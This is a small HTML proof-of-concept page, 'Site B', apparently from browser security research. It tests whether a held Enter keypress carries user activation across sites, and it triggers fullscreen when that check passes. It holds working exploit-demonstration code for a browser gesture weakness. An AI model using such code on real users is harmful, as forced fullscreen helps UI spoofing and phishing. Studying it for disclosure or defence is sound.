<!DOCTYPE html>
<html>

<head>
    <title>PoC - Site B (Fullscreen)</title>
    <style>
        body {
            font-family: monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: white;
        }

        #timer {
            font-size: 3rem;
            font-weight: bold;
        }

        #status {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>

<body>
    <div id="timer">2s...</div>
    <div id="status">Tahan terus sampai 1s</div>

    <script>
        setTimeout(() => {
            document.getElementById('timer').innerText = "1s...";
        }, 1000);

        setTimeout(() => {
            document.getElementById('timer').innerText = "LEPAS!";
        }, 2000);

        window.addEventListener('keyup', async (e) => {
            if (e.key === 'Enter') {
                const status = document.getElementById('status');

                console.log("Activation State:", navigator.userActivation.isActive);

                if (navigator.userActivation.isActive) {
                    try {
                        await document.documentElement.requestFullscreen();

                        status.innerText = "RESULT: SUCCESS (Entered Fullscreen!)";
                        status.style.color = "green";

                        console.log("Ghost Gesture Success: Fullscreen triggered.");

                    } catch (err) {
                        status.innerText = "RESULT: FAILED (Fullscreen Blocked)";
                        status.style.color = "red";

                        console.error(err);
                    }
                } else {
                    status.innerText = "RESULT: EXPIRED (User Activation lost)";
                    status.style.color = "blue";
                }
            }
        });
    </script>
</body>

</html>
